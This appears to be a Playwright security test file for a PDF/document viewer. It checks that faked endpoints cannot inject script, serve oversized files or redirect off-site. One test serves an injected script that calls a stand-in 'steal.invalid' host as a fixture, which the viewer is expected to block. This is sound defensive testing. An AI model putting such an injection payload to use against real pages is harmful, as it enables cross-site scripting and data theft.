import { test, expect } from "@playwright/test";

// Source-only contract falsifications against localhost fake endpoints.
// These are NOT authenticated FolioRelay routes or production PDF evidence.
const admitted = "job-" + "a".repeat(64);
const url = "/viewer?job_id=" + admitted;

test("fake preview HTML/polyglot response never becomes executable document", async ({ page }) => {
  const requests = [];
  page.on("request", r => requests.push(r.url()));
  await page.route("**/api/v1/jobs/*/preview", r => r.fulfill({
    status: 200, contentType: "text/html",
    body: '<script id="injected">fetch("https://steal.invalid/")</script>'
  }));
  await page.goto(url);
  await expect(page.locator("#preview")).toHaveAttribute("data-state", "denied");
  await expect(page.locator("#page-canvas")).toBeHidden();
  await expect(page.locator("#download-original")).toBeHidden();
  expect(await page.locator("#injected").count()).toBe(0);
  expect(requests.every(x => new URL(x).origin === "http://127.0.0.1:18763")).toBe(true);
});

test("fake oversized PDF response is not parsed or exposed", async ({ page }) => {
  await page.route("**/api/v1/jobs/*/preview", r => r.fulfill({
    status: 200, contentType: "application/pdf",
    body: Buffer.alloc(10 * 1024 * 1024 + 1, 0x50)
  }));
  await page.goto(url);
  await expect(page.locator("#preview")).toHaveAttribute("data-state", "denied");
  await expect(page.locator("#download-original")).toBeHidden();
  await expect(page.locator("#page-canvas")).toBeHidden();
});

test("fake external redirect is rejected without third-party request", async ({ page }) => {
  const requests = [];
  page.on("request", r => requests.push(r.url()));
  // A real HTTP 302 is emitted by the localhost-only synthetic server,
  // not by route.fulfill (which WebKit's Playwright driver rejects).
  await page.goto("/viewer?job_id=" + "job-" + "f".repeat(64));
  await expect(page.locator("#preview")).toHaveAttribute("data-state", "denied");
  await expect(page.locator("#download-original")).toBeHidden();
  expect(requests.every(x => new URL(x).origin === "http://127.0.0.1:18763")).toBe(true);
});

test("fake server does not declare preview permitted by client-side route alone", async ({ page }) => {
  await page.goto("/viewer?job_id=" + "job-" + "e".repeat(64));
  await expect(page.locator("#preview")).toHaveAttribute("data-state", "denied");
  await expect(page.locator("#page-canvas")).toBeHidden();
  await expect(page.locator("#download-original")).toBeHidden();
});
